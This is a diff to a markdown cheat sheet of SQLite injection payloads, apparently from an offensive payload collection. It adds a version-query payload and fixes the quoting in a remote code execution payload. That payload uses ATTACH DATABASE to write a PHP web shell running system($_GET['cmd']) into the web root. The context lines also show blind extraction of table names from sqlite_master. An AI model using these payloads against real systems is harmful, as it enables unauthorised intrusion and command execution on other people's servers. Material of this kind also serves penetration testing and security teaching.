@@ -1,5 +1,9 @@
 # SQLite Injection
 
+## SQLite version
+```
+select sqlite_version();
+```
 
 ## Integer/String based - Extract table name
 ```
@@ -34,9 +38,9 @@ and (SELECT hex(substr(tbl_name,1,1)) FROM sqlite_master WHERE type='table' and 
 
 ## Remote Command Execution using SQLite command - Attach Database
 ```
-ATTACH DATABASE ‘/var/www/lol.php’ AS lol;
+ATTACH DATABASE '/var/www/lol.php' AS lol;
 CREATE TABLE lol.pwn (dataz text);
-INSERT INTO lol.pwn (dataz) VALUES (‘<?system($_GET[‘cmd’]); ?>’);--
+INSERT INTO lol.pwn (dataz) VALUES ('<?system($_GET['cmd']); ?>');--
 ```
 
 ## Remote Command Execution using SQLite command - Load_extension
